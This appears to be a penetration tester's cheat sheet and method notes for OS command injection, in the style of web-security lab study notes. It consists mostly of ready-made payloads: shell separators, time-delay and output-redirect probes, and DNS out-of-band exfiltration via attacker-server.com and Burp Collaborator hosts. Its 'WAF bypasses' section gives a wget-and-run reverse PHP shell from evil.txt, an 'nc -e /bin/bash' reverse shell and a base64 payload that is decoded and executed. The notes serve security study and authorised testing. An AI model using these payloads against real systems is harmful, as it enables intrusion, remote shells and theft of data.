# Cheatsheet
```txt
--------------------------------------------------------------------
Special Characters
&
;
Newline (0x0a or \n)
&&
|
||
`command`
$(command)
--------------------------------------------------------------------
Useful Commands: Linux
whoami
ifconfig
ls
uname -a
--------------------------------------------------------------------
Useful Commands: Windows
whoami
ipconfig
dir
ver
--------------------------------------------------------------------
Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&&id; ls &&id; ls&& id; ls && id 
ls&id; ls &id; ls& id; ls & id 
ls %0A id
--------------------------------------------------------------------
Time Delay Commands
& ping -c 10 127.0.0.1 &
--------------------------------------------------------------------
Redirecting output
& whoami > /var/www/images/output.txt &
--------------------------------------------------------------------
OOB (Out Of Band) Exploitation
& nslookup attacker-server.com &
& nslookup `whoami`.attacker-server.com &
-------------------------------------------------------------------
WAF bypasses
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
/tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
--------------------------------------------------------------------
```


# Methods
## Simple 
- Script parameters can be injected with OS commands using certain sequences like `;` or `&`. For example, if a script runs `stock.pl 12 29`, then the `29` parameter can be edited to inject commands like `29 & whoami` or `29; whoami`

Example: `productId=1&storeId=1;whoami`

## Blind injection, time delays
Example: Injection in email parameter

```txt
||ping -c 10 127.0.0.1||
```

## Blind injection, redirect output
- Can sometimes redirect output to a writable common directory (like `/var/www/images`) and access it with the browser to confirm an injection vulnerability

Example: 

```txt
||whoami > /var/www/images/out.txt||
```

## Blind injection, out-of-band interaction
- Can verify injection vulnerability with out-of-band requests (like DNS requests) using the Burp Collaborator public servers

Example:

```txt
||nslookup gaui95zup775djzi3ivc73vzcqik69.burpcollaborator.net||
```

![[5af1b46d6cbb8f921c622492626fcc8e-1.png]]


## Blind injection, out-of-band exfiltration
- Can even exfiltrate data with out-of-band requests with an inline command (and bogus subdomain request)

Example: 

```txt
email=||nslookup $(whoami).86cqxrz7k5bt71be0bmo1qxbp2vtji.burpcollaborator.net||
```

![[0e3a6580220ed4383c02b620333de65d-1.png]]